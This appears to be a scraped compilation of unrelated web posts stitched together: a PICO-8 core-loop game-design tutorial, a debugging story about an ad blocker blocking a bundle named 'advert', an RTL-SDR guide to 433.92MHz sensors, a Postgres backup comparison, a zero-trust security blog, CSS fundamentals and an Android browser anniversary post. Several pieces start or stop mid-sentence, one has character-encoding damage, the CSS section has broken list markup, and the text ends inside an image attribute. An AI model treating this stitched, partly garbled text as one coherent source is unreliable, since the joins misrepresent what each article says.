The player returns.</p><p><em>Ad infinitum.</em> Until either the player or opponent breaks the loop, because they failed to return the ball.</p><p>Tennis folks call this a rally, but for us, this repeating structure is the game's core loop. It's exactly what we were looking for.</p><p>A core loop is the game's <em>essential activity</em>. Every sport has one, and every game has one:</p><ul><li>Baseball: a pitcher pitches a ball; a batter hits the ball, or misses.</li><li>Football: a quarterback receives the ball, and makes a play.</li></ul><p>Games have larger loops of course! In baseball, runners run to bases around a diamond. There are innings. There are game series.</p><p>But we seek the smallest, tightest loop of the game. Such that if you take this loop away, the game won't work.</p><p>Can you find a game that <em>doesn't</em> have a core loop? Heck, one can argue that visual novels –&nbsp;which are heavily story-based –&nbsp;have a core loop of dialogue navigation.</p><p>Since <a href="https://teamavocado.co/sports-game">we're making a boxing game</a>, let's identify the core loop:</p><ol><li>A boxer throws a punch.</li><li>An opponent evades or blocks the punch, or throws a punch back.</li></ol><p>From that core idea, we can scope our project.</p><h2 id="define-project-milestones">2. Define project milestones</h2><p>When game developers say to build on a strong core, they refer to core loops.</p><p>Wanna know why?</p><p>Once you've identified your game's core loop, the path forward is clear:</p><ol><li>🧭 <s><strong>The Goal.</strong> Do you want to tell a story? Express a feeling? Fulfill a game jam prompt? Make a game for a certain demographic?</s></li><li>🍏 <s><strong>The Core Loop.</strong> What's the essential activity that defines your game?</s></li><li>👩 <strong>The First Playable.</strong> Get stuff moving on screen ASAP. Code up your core loop so that your mom can play it.</li><li>🥞 <strong>The Horizontal Slice.</strong> Full gameplay. All game mechanics finalized, including progression and leveling mechanics.</li><li>🍰 <strong>The Vertical Slice.</strong> Full user experience with all game states. Includes menus, and win-lose conditions.</li><li>💅 <strong>Polish.</strong> Juice up your feedback. Add more content.</li><li>🎂 <strong>The Full Cake.</strong> The final game.</li></ol><p>Oh, and if you're using PICO-8, you might need to optimize tokens in between steps. 😛</p><p>These milestones will guide us through the rest of the tutorial series, so keep it in mind!</p><h2 id="design-your-game-loops-length">3. Design your game loop's length</h2><p>I think a <strong>good</strong> game is one where the total player time far exceeds the development time.</p><p>Why? Because players can replay your game over and over if it's genuinely fun. On the other hand, you only had to make the game once.</p><p>You get a lot more bang for your buck.</p><p>Part of that comes from the length of the higher-level game loop.</p><p>If you recall Pico Tennis, the <em>essential activity</em> is hitting the ball back and forth. But the higher-level <em>game</em> loop is the <em>rally</em>.</p><p>And in Pico Tennis, a rally lasts maybe a minute. This is important!</p><p>If you're designing for busy people who play games in pockets of time, maybe you want minute-long game loops. So players can play several rounds within the span of a coffee break.</p><p>(An interesting take: Jan Willem Nijman's <em>Minit</em> has game length in its name. Its game loop lasts exactly 60 seconds.)</p><blockquote><p><em>"Man, that's deep. Can I get some dog treats now?"</em></p><p><em>– Paraphrasing my dog, as she stares intently into my soul.</em></p></blockquote><p>Once you understand the idea of a core loop, you start to see them everywhere.</p><p>Take the game of life.</p><p>Not Conway's Game of Life! But actual day-to-day life.</p><p>The core loop of life is a <em>day</em>. And within those iterations lies a life <em>story</em>.</p><p>(From now on, maybe you'll think twice before creating a recurring event in Google Calendar.)</p><p>That's what we're aiming for. With a game's core loop, we tell a story.</p><p>What story do you want to tell?</p><p>In the next blog post, we'll discuss how to go from core loop to <a href="#define-project-milestones">First Playable</a>.</p><hr><h2>🏃‍♀️ Exercise</h2><p>Try it!</p><p>Head over to the PICO-8 BBS.

July 17, 2020 | https://alexkondov.com/how-a-chrome-extension-broke-my-web-app/ | <a href="https://web.archive.org/web/*/https://alexkondov.com/how-a-chrome-extension-broke-my-web-app/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>After a long break from personal projects, the situation around the virus inspired me to build something on the side again. I’ll spare you the details but I decided to build a new kind of job board that would let developers browse open positions based on the technologies they are interested in.</p>
<p>It’s a straight forward full-stack JavaScript application that uses React in the browser, Express on the server and Dynamo for storage. As much as I wanted to give Go, or Svelte a try I wanted to ship something fast. Learning a new technology on the go wasn’t compatible with that goal.</p>
<h2>The First Tests</h2>
<p>So I invested around 40-50 hours in an alpha version that had all the basic functionality in place. It wasn’t visually fascinating but it got the job done. I decided to Heroku for the Express app and Vercel for the React one.</p>
<p>Once the alpha version was ready, I entered a few commands in the terminal and I it deployed for the world to see. I sent it to a couple of my friends to get some feedback. They told me what they liked and what they didn’t and uncovered a few bugs along the way. I had plenty of work to do.</p>
<h2>“Probably nothing serious…”</h2>
<p>One of the bugs they discovered was quite unfortunate. The most important feature of the app was a rich, long form which had a lot of client side functionality. It has different fields, WYSIWYG editors, file uploads, drag and drop elements and what not. Turns out the whole form didn’t on Chrome.</p>
<p>The app was still in its infancy so I didn’t pay much attention to that. I had probably broken something small by accident just before deploying. I didn’t even open the console because I expected to see <code>cannot read property state of undefined</code> or something in those lines. You know what I mean.</p>
<p>Probably nothing serious. So did I think…</p>
<h2>The Plot Thickens</h2>
<p>A couple of weeks later I had made some improvements and fixes. I settled on a name, picked fonts and colors and gave the app a bit of personality. It was time to ship the next version. I tested locally and everything worked fine, including the form.</p>
<p>I run a few commands, type the domain name in the browser and there it is. Everything looks great. I send out the links again and wait for the responses, tapping my foot on the floor. The three dots signaling that someone is writing appeared in the chat box. A couple of seconds later the first message popped up - “The form doesn’t work again”.</p>
<p>That’s not right I tested multiple times. I checked the console and there weren’t even warnings. I didn’t want this to be a blocker for the test so I rolled my sleeves up and started digging. I opened the form on the production environment. Wrote a few letters in one of the text fields - and the form didn’t work.</p>
<p>There’s a small preview widget on the side that should be updated as you type but it wasn’t working. No errors in the console either. I run the app locally and everything works seamlessly. There’s something wrong with the production environment.</p>
<p>But how could that impact the page? I didn’t use any environment variables there, nothing platform specific either. I decided to check the behavior in different browsers. Started Firefox, went to the app and opened the form. It worked. Everything was updated as expected. I started Safari and checked the form there. Everything works again.</p>
<h2>We Knot Who, But We Don’t Know Why</h2>
<p>My friend experienced the same behavior - the bug was only in Chrome. I was completely puzzled. I never thought that Chrome of all browsers would be causing unexpected bugs. It’s usually the others that require special attention. At least I know where the problem is - time to dig.</p>
<p>I rolled my sleeves up and opened the dev tools. I wasn’t using any unsupported browser APIs so it’s not that. No application errors but in the Network tab I see that some of the requests are marked as blocked without a status code for the response. Huh?</p>
<p>Unsurprisingly, those requests are for the JavaScript bundles that make the form page functional. The other pages are working fine, though. Their JS gets downloaded successfully. The one for the form, however, is marked as blocked without any message or any response.</p>
<p>My first thought was that a security rule in Chrome could be blocking the files for some reason. I did some reading around cookies, CORS, checked the configuration in Vercel but found no leads there. I scoured the web (and by that I mean Stack Overflow), searched for different phrases and problems that could give me some insight into what is happening.</p>
<p>No thread, or documentation page held any answers for me.</p>
<h2>On The Verge Of Desperation</h2>
<p>What I thought would be a trivial problem related to a missing check in JavaScript turned out to be a massive blocker. I can’t ship the app without the form. If it was failing only in Safari I could live with it. But this is Chrome - everybody’s using it.</p>
<p>At this point I had already spend my Saturday afternoon with no success. The wise thing here would be to call it a day and go back tomorrow with a clean mind. But since I was so invested I pressed on and continued to jam random words related to the problem in the search bar.</p>
<p>Then something happened. Somehow I put the correct combination of words, the stars aligned and at the top of the list I saw a link. It still had the blue color of a page that I still hadn’t opened. It was a question on Stack Overflow, of course.</p>
<p>I had already opened around 10 such threads, all with similar names, but hope dies last. I click on the link, hold my breath and start digging through the comments. Most of the responses and ideas I had already tried, they were of no help. But as I was about to click the back button, my eye was caught by one of the responses lower on the list. </p>
<h2>A New Hope</h2>
<p>It had the meager 7 upvotes but it was worth the try. All it said was to check the Chrome extensions since one of them could be interfering with the network call. Up until this moment I hadn’t even thought about them. They have access to everything on the page but in my 6 years of web development I hadn’t experienced any problems because of an extension.</p>
<p>But at this point I couldn’t rule it out.</p>
<p>I once again examined the unfortunate bundle. They are all named with an identifier, followed by a hash and the file extension - <code>index</code>, <code>create</code>, <code>listing</code>, <code>advert</code>. The blocked one that was breaking the form page was the <code>advert</code> bundle. I looked at the name for a second. Then I looked at the line of extensions next to the address bar. I looked at the name again. Then back to the extensions. Oh no…</p>
<p>A small red icon on the extension bar caught my attention - the AdBlocker. Could this be it? I disabled the AdBlocker and lo and behold - the page was fully functional. My friend got the same result. Apparently because the file contained the word <strong>advert</strong> it was getting blocked by the extension.</p>
<p>Everyone that tested on Chrome experienced the problem with the form. That’s because that’s their default browser and they most likely have some ad blocking add-on. Once they switched to another browser which they didn’t use and had no extensions installed, everything would work.</p>
<p>I didn’t expect AdBlocker to be that unforgiving but as a person who is not that fond of ads, I should be careful what domain language I use in my applications.</p>
<h2>Live To Tell The Tale</h2>
<p>So, this is it. The result of a Saturday afternoon spent debugging obscure problems. After such a session you usually go out of the room with a stern look on your face. Walking like a veteran with all your knowledge and the things you’ve seen. Well, I can’t say I learned anything new but I’ll be really careful with how I name my files from now on.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><h2 id="introduction">Introduction</h2>
<p>I was always interested in the RF world, the fact that we are surrounded by an infinite amount of invisible waves that carry information is intriguing. A lot has changed over the years, the technology advanced and today you can easily dive into the electromagnetic realm without fiddling with mountains of equipment and burning your pocket.</p>
<p>In this post we’ll explore using RTL-SDR to read live temperature and humidity stats from cheap 433.92Mhz modules, feeding them to InfluxDB using rtl_433, MQTT and Telegraf on a Raspberry Pi (but any Linux based device can work)</p>
<h2 id="hardware">Hardware</h2>
<p><strong><a href="https://www.amazon.com/gp/product/B011HVUEME/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=B011HVUEME&amp;linkCode=as2&amp;tag=rsv0f-20&amp;linkId=b3bd3c48a6a7e921144609cb59359f0e" target="_blank" rel="noopener noreffer">RTL-SDR</a></strong></p>
<p>The definition of SDR is “Software Defined Radio”, it’s a radio-communication system where instead of using components that were traditionally implemented in hardware - software is used, allowing greater flexibility and reducing costs.</p>
<p>RTL-SDR is a high quality USB dongle (but relatively cheap at ~$25) that can be used to scan and receive radio signals from 500Khz (24Mhz for the device I used) up to 1.75Ghz. It was designed and built by the awesome dudes over at <a href="https://www.rtl-sdr.com/about-rtl-sdr/" target="_blank" rel="noopener noreffer">RTL-SDR.com</a> based on DVB-T TV tuner dongles. I ordered <a href="https://www.amazon.com/gp/product/B011HVUEME/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=B011HVUEME&amp;linkCode=as2&amp;tag=rsv0f-20&amp;linkId=b3bd3c48a6a7e921144609cb59359f0e" target="_blank" rel="noopener noreffer">this</a> kit which included two modular dipole antennas.</p>

<p>Almost any RF based wireless thermometer / humidity sensor is probably readable by <code>rtl_433</code>. Since we’re talking about cheap hardware you can’t really get any assurances, checking the RF frequency is probably enough - if it says 433.92Mhz, you are 99% good. I’ve used <a href="https://www.aliexpress.com/item/33006820989.html?spm=a2g0s.9042311.0.0.1b754c4dDEUyyf" target="_blank" rel="noopener noreffer">this</a> as my indoor sensor and <a href="https://www.aliexpress.com/item/4000872896502.html?spm=a2g0s.9042311.0.0.419a4c4duApRRx" target="_blank" rel="noopener noreffer">this</a> as my outdoor, for monitoring my garden soil humidity level and outdoor temperature</p>

<h2 id="software">Software</h2>
<p><strong><a href="https://cubicsdr.com/" target="_blank" rel="noopener noreffer">CubicSDR for MacOS</a></strong></p>
<p>This is an awesome free open-source software for SDR. It wasn’t easy finding one for MacOS, most of the commonly-used projects are made for Linux and Windows. It’s not really required for decoding 433.92Mhz signals, but I wanted to get my hands dirty and look on live RF, it’s pretty neat (and of course to test the device is actually working!)</p>
<p><strong><a href="https://github.com/merbanan/rtl_433" target="_blank" rel="noopener noreffer">rtl_433</a></strong></p>
<p>An amazing project that can be used to decode a variety of RF-based devices on various frequencies (433.92 MHz, 868 MHz, 315 MHz, 345 MHz, and 915 MHz ISM bands). This is the software that does the heavy lifting.</p>
<p><strong><a href="https://github.com/eclipse/mosquitto" target="_blank" rel="noopener noreffer">Mosquitto</a></strong></p>
<p>Very simple MQTT server and client implementation, we’ll be using that as the output of rtl_433 and input of Telegraf to stream the metrics to a remote InfluxDB instance.</p>
<p><strong><a href="https://github.com/influxdata/telegraf" target="_blank" rel="noopener noreffer">Telegraf</a></strong></p>
<p>Agent for collecting and writing metrics. It will subscribe to our MQTT queue, parse and transmit the metrics to InfluxDB.</p>
<h2 id="getting-a-signal">Getting a signal</h2>
<h3 id="connecting-the-antennas">Connecting the antennas</h3>
<p>Let’s start by quickly testing our shiny RTL-SDR receiver, I’ve used the two short 5cm dipole telescopic antennas for this test, you should definitely read <a href="https://www.rtl-sdr.com/using-our-new-dipole-antenna-kit/" target="_blank" rel="noopener noreffer">this great guide</a> that the awesome dudes over at rtl-sdr.com wrote on using the provided antennas. The antenna used is critical for getting high-quality signal in some cases. For our radio FM test any antenna will probably suffice, but if you want to receive <a href="http://happysat.nl/Setup_Meteor/Setup.html" target="_blank" rel="noopener noreffer">weather satellite signal running on 137Mhz</a>, you’ll have to be more specific.</p>
<p>Hopefully you’ve ended up with something like this:</p>

<h3 id="listening-to-radio">Listening to radio</h3>
<p>Now you can connect the dongle to your usb port, launch CubicSDR, choose “Generic RTL2832U OEM” and hit “Start”, you can ignore the extra settings you see on the right for now. You should see a pretty moving signal heatmap, you can change the center frequency by hovering over it and tapping space (the key), I chose a local FM radio station that is broadcasting on 88Mhz (FM).</p>
<p>Now your bandwidth setting should be set to 200Khz, you should get a nice signal and when you hover your mouse over it the band will “encapsulate” the signal, click and you should start hearing radio!</p>
<h3 id="checking-frequency-43392mhz">Checking Frequency 433.92Mhz</h3>
<p>Let’s get ready to use <code>rtl_433</code> by looking at the frequency and making sure there are devices there. Usually they will transmit information in 30 second bursts, you can change the center frequency to 433.92Mhz and check that you see data. Near the end of the video above you can see the signal bursts when I switch to 433.92Mhz</p>

This post briefly covers each type and discusses the situations where you would use either one.</p><p>We'll cover some of the many tools you can use for Postgres backups in future posts.</p><h2>Logical Backups</h2><p>This form of backup is typically achieved by <a href="https://www.postgresql.org/docs/current/backup-dump.html">translating all the data into a set of SQL commands and writing it into a single file</a>. This can then be fed to any database cluster to recreate everything. In your CLI, performing logical backups can be as easy as:</p><div><div><div tabindex="0"><div><p><span>pg_dump db_name </span><span>&gt;</span><span> file_name.sql</span></p></div></div></div></div><p>for a single database, and:</p><div><div><div tabindex="0"><div><p><span>pg_dumpall </span><span>&gt;</span><span> file_name.sql</span></p></div></div></div></div><p>for an entire database cluster.

Recovering from them is comparably as simple:</p><div><div><div tabindex="0"><div><p><span>psql -d db_name -f file_name.sql</span></p></div></div></div></div><h3>What is it good for?</h3><h4>Simpler and quicker way of performing backups</h4><p>As shown above, a single command is enough to perform a logical backup and another to recover from it. As a novice with databases, this would be an ideal and non-intimidating ensure that your database is backed up at all times.</p><h4>Migration between different major versions of Postgres</h4><p>If you are planning to migrate to a different major version of Postgres (for example, from Postgres 11 to Postgres 12), logical backups via <code>pg_dumpall</code> would surely be your <a href="https://www.postgresql.org/docs/current/upgrading.html">tool of choice</a>. This is mainly because internal data storage formats may differ between major versions. This is the basis of physical backups, eliminating it as an option when upgrading. We'll go deeper into migrations and how to perform them in another post.</p><h4>Backing up a single specific database</h4><p>With <code>pg_dump</code>, you can constantly back up a single, targeted database.</p><h2>Physical Backups</h2><p>Physical backups pertain to the actual set of files or file systems where your database data is stored. One option for physical backups involves <a href="https://www.postgresql.org/docs/current/backup-file.html">taking a snapshot</a> of your data files by making a copy of them.</p><h3>What is it good for?</h3><h4>More ideal for larger databases</h4><p>As your database grows to the size of a few gigabytes, backing it up through physical backups is more ideal than through logical backups. As explained <a href="https://devcenter.heroku.com/articles/heroku-postgres-data-safety-and-continuous-protection#the-performance-impact-of-logical-backups" target="_blank" rel="noopener noreferrer">here</a>, over time, performing logical backups in large databases could lead to degraded performance for other queries. Given the long run time as well to successfully perform a logical backup on a large database, errors have a higher chance of occurring, making the eventual backup unusable.</p><h4>Achieving Point in Time Recovery</h4><p>Postgres also generates <a href="https://www.postgresql.org/docs/current/wal-intro.html">Write Ahead Log</a> (WAL) files, which can be used together with a backed-up file system to <a href="https://www.postgresql.org/docs/current/continuous-archiving.html">recover a database up to any chosen point in time</a>. When disaster strikes, this is one of the best options for recreating your database up to the point right before the unfortunate happens. This greatly minimizes <a href="https://www.ibm.com/services/business-continuity/rpo" target="_blank" rel="noopener noreferrer">Recovery Point Objective (RPO)</a> along the way. Even better, tools such as <a href="https://github.com/wal-g/wal-g" target="_blank" rel="noopener noreferrer">WAL-G</a> are readily available to simplify the steps involved in setting this up.</p><h2>Conclusion</h2><p>All in all, logical and physical backups are generated differently from one another. Neither has an advantage over the other. Depending on your needs, each brings unique uses to the table:</p><table><thead><tr><th>Logical</th><th>Physical</th></tr></thead><tbody><tr><td>Simpler way of getting started with backups.</td><td>Better way of handling backups for larger database clusters.</td></tr><tr><td>Using it to migrate between different major versions of Postgres.</td><td>Using it for Point in Time Recovery.</td></tr><tr><td>Having the option to back up a single database.</td><td></td></tr></tbody></table></section></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><span><span>Reading Time: </span> <span>3</span> <span>minutes</span></span></p><p><span>The word trust is a common theme in cybersecurity when it comes to network breaches, yet the idea of lack of trust is whatâ€™s highlighted in these breaches. A companyâ€™s feeling of safety and security can disappear in a nanosecond once their network has been infiltrated, and all control of networks and applications is lost. For all tech-forward organizations, the feeling of lost control becomes more universal with every new breach to hit the headlines.</span></p><p><span>While in some industries this scary feeling may be up and coming, in the network security landscape it is not a new phenomenon. Whether from malware, ransomware, or your classic unauthorized access network breach </span><a href="https://www.perimeter81.com/blog/news/the-capital-one-data-breach-how-crisis-could-have-been-averted/"><span>like we saw with Capital One</span></a><span>, zero optimism is entertained concerning the safety of companies and individuals from hackers. Awareness of oneâ€™s level of a vulnerability is a prerequisite to safety and enables one to take pragmatic steps to secure their data.Â&nbsp;</span></p><h2><span>Rethink the Approach for Network SecurityÂ&nbsp;</span></h2><p><span>Until recently, the organizationâ€™s IT and security teams primarily focused all their security efforts on fighting off different attacks on the perimeter. While this was the right approach when everyone worked in the same office, times have changed. Due to COVID-19 accelerating the â€œwork from anywhereâ€� approach, we need to rethink network security strategies and pivot them around the user instead of where the network is based.Â&nbsp;</span></p><p><span>With more employees working outside the physical office, there is a quickly growing number of endpoints for hackers to attack. In most organizations, the typical employee uses multiple devices to do their daily job. Is each device secure? The answer is probably yes – but you canâ€™t be certain. With each unsecured every device, organizationsâ€™ networks are taking an unnecessary risk. When networks are breached, the process of understanding where and how access was gained is not instant and by the time you have your answers, it is too late.</span></p><p><span>IT and security teams need to change their approach, and instead of solely emphasizing perimeter security, transform their employeesâ€™ permissions and access policies. One of the most common mistakes organizations make is trusting their users when it comes to authorized access. When you provide unrestricted access to any user or device in your network, you simply open the gates for your organizationâ€™s network to be breached.Â&nbsp;</span></p><p><span>Once a user or organization is compromised, their credentials can easily be used to infiltrate the network, especially with different attacks. This presents the idea that organizations need to have better visibility when it comes to authorized user access to their network. So how can organizations trust their employees once again?</span></p><h2><span>Zero Trust Helping Us Trust AgainÂ&nbsp;</span></h2><p><span>Can we trust our employees once again, and reduce their responsibility and impact as guards of the organizationâ€™s network against hackers? I believe we can, as humans are meant to be trusted even though in many instances human error puts that trust in doubt. People arenâ€™t perfect, we all make mistakes, but we must account for them proactively.</span></p><p><span>A common approach that has gained popularity over the past decade for secure network access is by implementing the <a href="https://www.perimeter81.com/solutions/zero-trust-security">Zero Trust model</a>. Zero Trust was </span><span>originally proposed by Forrester in 2010, with the motto </span><span>â€œnever trust, always verifyâ€�. This is the idea that until the user can verify him or herself via authentication, they will not receive access to the network. </span><span>Adopting Zero Trust is not a specific product or architecture, instead, itâ€™s taking a more modern approach of setting up organization-wide guidelines inside the companyâ€™s resources.Â&nbsp;</span></p><p><span>By implementing the ZTNA model for secure network access, IT teams will have full control over who is granted access, enters and leaves the network at all times. For each network, resource or application, there should be a set of rules and policies in place enforced by the key elements of the Zero Trust model: multi-factor authentication, proper device management, limited privileged access and network segmentation using software-defined architecture.</span></p><h2><span>ZTNA The Approach Not the ModelÂ&nbsp;</span></h2><p><span>Organizations that take the right approach with ZTNA can erase the concept of trusting in their employees and wonâ€™t fear to grant access. To achieve secure network access inside your organization you will need to have the proper principles implemented and distributed throughout the company. Treat </span><a href="https://www.perimeter81.com/zero-trust-network-access"><span>Zero Trust Network Access</span></a><span> as a manual for how organizations should strategize and â€œtrustâ€� their employees with the keys to the kingdom.Â&nbsp;</span></p></div></div>]]>

                    <section>
                <p>I learned how to build websites the old fashioned way: looking at website source code and trying to replicate the things I saw. I threw in the odd book for the stuff I couldn’t <em>see</em> (like PHP/MySQL), and I was on my way.</p>

<p>This was back in 1999, when we’d write things like <code>&lt;font size="4" color="#000000"&gt;</code> and DHTML was a <em>thing</em>.</p>

<p>When CSS came along my approach to learning didn’t differ. But I <em>really</em> wish I’d taken the time to learn CSS properly: there was so much fundamental stuff I missed.</p>

<p>Here are some things I didn’t know that I wish I’d learned earlier.</p>

            </section>
        
        
        
        
        
        
        
        
        
        
        
            
        
        
                        
<h2 id="block-inline-and-inline-block">Block, inline and inline-block</h2> 
        
        
        
        
        
        
        
        
        
            
                    <section>
                <p>Even though I <em>knew</em> about these properties, I didn’t fully understand them for a long time.</p>

<p>Here’s a breakdown:</p>

<ul>
<li><code>block</code> elements expand horizontally to take up a whole line (like a heading). We can apply vertical margin to these.</li>
<li><code>inline</code> elements expand horizontally just enough to contain their content (like <code>strong</code> or <code>em</code> elements). We <strong>cannot apply vertical margins to these</strong> and they should usually be placed inside a <code>block</code> element.</li>
<li><code>inline-block</code> elements are like <code>inline</code> elements, <strong>but you can apply vertical margins to these</strong> (making them useful for things like buttons).</li>
</ul>

<p>In the example below, <code>block</code> elements have a blue border, <code>inline</code> elements have an orange background, and our <code>inline-block</code> element has a red border.</p>

                    <section>
                <p>Images being inline by default isn’t a problem, but it can cause confusion when trying to position them or add vertical margins.</p>

<p>If your CSS reset doesn’t include this already, I’d suggest adding the following rule:</p>

<pre><code>img {
    display: block;
}
</code></pre>

<p>That will make their behaviour much more predictable. You might also want to add <code>max-width: 100%;</code> to stop them breaking out of their container, too.</p>

            </section>
        
        
        
        
        
        
        
        
        
        
        
            
        
        
                        
<h2 id="how-height-and-width-are-calculated">How height and width are calculated</h2> 
        
        
        
        
        
        
        
        
        
            
                    <section>
                <p>By default, the width/height of a box is calculated by adding together the dimensions of the:</p>

<ul>
<li>Content area</li>
<li>Padding area</li>
<li>Border area</li>
</ul>

<p>This isn’t usually a problem for an element’s height: we’re usually not too bothered about how content reflows vertically. The problems usually occur when trying to calculate an element’s width, especially if there’s more than one element in a row.</p>

<p>If we had the following CSS:</p>

<pre><code>.some-class {
    width: 50%;
    padding: 2em;
    border: 0.1rem;
}
</code></pre>

<p>The total calculated <code>width</code> for <code>.some-class</code> would be:</p>

<p><code>50% + 4em + 0.2rem</code></p>

<p>That’s because of a property called <code>box-sizing</code> which has a default value of <code>content-box</code>. This value means the <code>width</code> property <strong>applies to the content area</strong>: everything else is added on top of this.</p>

<p>We can change this for all elements with the following rule:</p>

<pre><code>* {
    box-sizing: border-box;
}
</code></pre>

<p>Returning to our example, the element’s width would now apply to the <code>border</code>, so our element’s total <code>width</code> would be <code>50%</code>.</p>

<p>What happens to the <code>border</code> and <code>padding</code>? Those properties/values still apply, but they don’t affect the total <code>width</code> of the element: they sit within the defined area.</p>

<li><code>margin</code> is the space <strong>between</strong> elements</li>
<li><code>padding</code> is space <strong>inside</strong> an element</li>
</ul>

<p>That makes <code>padding</code> useful for elements that have a <code>background</code>. We often don’t want the content to be close to the edge of the element’s box and <code>padding</code> helps us achieve that.</p>

                <p>This has been the source of frustration for CSS newcomers for a long time. Rachel Andrew <a href="https://www.smashingmagazine.com/2019/07/margins-in-css/#margin-collapsing">describes the behaviour</a> as:</p>

<blockquote>
  <p>When margins collapse, they will combine so that the space between the two elements becomes the larger of the two margins. The smaller margin essentially ending up inside the larger one.</p>
</blockquote>

<p>If we have two block elements with <code>margin-bottom: 1em</code> on one element and <code>margin-top: 1.5em</code> on the element directly below it, the total space between the two elements would be <code>1.5em</code>.</p>

<p>We can see that here:</p>

                <p>When two margins meet, the larger margin absorbs the smaller margin. If the margins are the same value, they absorb each other.</p>

<p>As soon as we know this, <code>margin</code> calculations become easier. It might also change our approach to managing them, and that’s where something like <a href="https://cssfordesigners.com/articles/managing-vertical-margins-in-css">the Lobotomised Owl selector can be useful</a>.</p>

<p><strong>Note:</strong> Margins don’t collapse when the parent element is set to <code>display: grid</code> or <code>display: flex</code>.</p>

                <p>CSS stands for <strong>Cascading Style Sheets</strong>. It’s no surprise therefore that the <strong>cascade</strong> is one of the fundamental concepts of CSS.</p>

<p>Though we might be aware of how our own stylesheets interact with each other, we have to remember that there’s <strong>always a default browser stylesheet</strong>. This is loaded <em>before</em> any custom stylesheets, making it easy to redeclare existing values.</p>

<p>The declared styles vary by browser, but they’re the reason that, by default:</p>

<ul>
<li>Headings have different sizes</li>
<li>Text is black</li>
<li>Lists have bullet points</li>
<li>Elements have any <code>display</code> property (such as <code>block</code> or <code>inline</code>)</li>
</ul>

<p>And many other things.</p>

<p>Even if a website only has a single stylesheet, that stylesheet will always be merged with the browser’s default styles.</p>

                <p>Using pixels (<code>px</code>) is tempting because they’re simple to understand: declare <code>font-size: 24px</code> and the text will be <code>24px</code>. But that won’t provide a great user experience, particularly for users who resize content at the browser level or zoom into content.</p>

<p>I started using <code>em</code> (and later <code>rem</code>) for font sizing early. It took much longer to feel comfortable using <code>em</code> and <code>rem</code> for other things such as <code>padding</code>, <code>margin</code>, <code>letter-spacing</code> and <code>border</code>.</p>

<p>Understanding the difference between <code>em</code> and <code>rem</code> is critical to making relative units manageable. For instance, we might use <code>em</code> for <code>@media</code> queries and vertical margins, but <code>rem</code> for consistent <code>border-width</code>.</p>

<p>The benefits of going all-in on relative sizing are well-worth the small adjustment in thinking that requires.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Snap Search completes one year today 🥳</p><p>To be absolutely correct, it’s been a year since Version 1.1.1 went live on the store, I’m not even sure when I started working on it – but I assume at least 1 week before release.</p><p>This has been an amazing journey. I’ve made many apps/websites/products before – but never have I been so committed to something for so long. I usually get ‘bored’ after releasing and barely hold on for a month or so.</p><p>I’m going to try to share as much as I can about the inception of the idea, the process, what I learnt, future plans and then some numbers 📈</p><p>BUT, before I start – if you don’t have Snap Search and you have an Android device – consider downloading it: <a aria-label="undefined (opens in a new tab)" href="https://play.google.com/store/apps/details?id=cybersky.snapsearch" target="_blank" rel="noreferrer noopener">Google Play Store</a>.</p> <h2>Why a Browser for Android??</h2><p>Building a browser for Android was never the plan. Snap Search did not start as a browser. The idea was born as a <a aria-label="undefined (opens in a new tab)" href="https://chrome.google.com/webstore/detail/snap-sarch/diidgminbhdappppdmgglehmdoeiaheg" target="_blank" rel="noreferrer noopener">browser extension</a>. I’ve made many apps before, but it was the first time I was making an extension. I had so much fun making that, I literally just wanted to make an Android version of Snap Search because I wanted that thrill. The extension currently follows the exact same format:</p><ul><li>Select your website/search engine</li><li>Enter your search term</li><li>Results will show in Incognito Mode</li></ul><p>However, on Android I could do much more. Incognito mode alone is <span>not</span> safe for browsing. I went a step ahead and did a lot more on Android because it was technically possible for me.</p><h2>The Process ♺</h2><p>Honestly, I do not have any process. May be if I had one I’d make better stuff or may be this just works for me – I’m not sure and I doubt I’ll ever find out. I’m more of a build first guy than plan first guy. This is a comparison of what the first version looked vs what it looks like now:</p><figure><img src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1024x890.png" data-src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1024x890.png" alt="Home screen for Snap Search before vs now" data-srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1024x890.png 1024w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/07/before-after-300x261.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/07/before-after-768x668.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1536/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1536x1336.png 1536w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_2048/https://snapsearch.online/wp-content/uploads/2020/07/before-after-2048x1781.png 2048w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1160/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1160x1009.png 1160w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_58/https://snapsearch.online/wp-content/uploads/2020/07/before-after-58x50.png 58w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/07/before-after-650x565.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1000x870.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/07/before-after-50x43.png 50w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/07/before-after-1024x890.png 1024w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/07/before-after-300x261.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/07/before-after-768x668.png 768w, 